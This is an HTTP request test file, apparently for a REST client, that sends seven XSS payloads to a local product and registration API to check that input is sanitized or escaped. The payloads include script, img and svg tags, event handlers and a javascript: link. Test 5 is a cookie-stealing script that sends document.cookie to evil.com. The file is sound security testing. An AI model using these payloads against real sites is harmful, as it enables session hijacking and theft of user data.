### XSS (Cross-Site Scripting) Tests

# Test 1: XSS in Product Name - Script Tag
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "<script>alert('XSS')</script>",
  "description": "Test product",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Test 2: XSS with Image Tag
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "<img src=x onerror=alert('XSS')>",
  "description": "Test product",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Test 3: XSS with SVG
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "<svg onload=alert('XSS')>",
  "description": "Test product",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Test 4: XSS in Description with Event Handler
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "Normal Product",
  "description": "<div onmouseover='alert(\"XSS\")'>Hover me</div>",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Test 5: XSS in Registration Username
POST http://localhost:8080/api/auth/register
Content-Type: application/json

{
  "username": "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
  "password": "password123",
  "email": "test@test.com"
}

###

# Test 6: XSS with HTML Entities
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "&#60;script&#62;alert('XSS')&#60;/script&#62;",
  "description": "Test",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Test 7: XSS in Product Description with JavaScript Protocol
POST http://localhost:8080/api/products
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "name": "Test Product",
  "description": "<a href='javascript:alert(\"XSS\")'>Click me</a>",
  "price": 100,
  "quantity": 10,
  "categoryId": 1
}

###

# Expected Results:
# - All XSS payloads should be SANITIZED or ESCAPED
# - Status: 201 Created (but content is safe)
# - Script tags should not be executable
# - Special characters should be encoded: < becomes &lt; > becomes &gt;
# - Response should NOT contain raw script tags
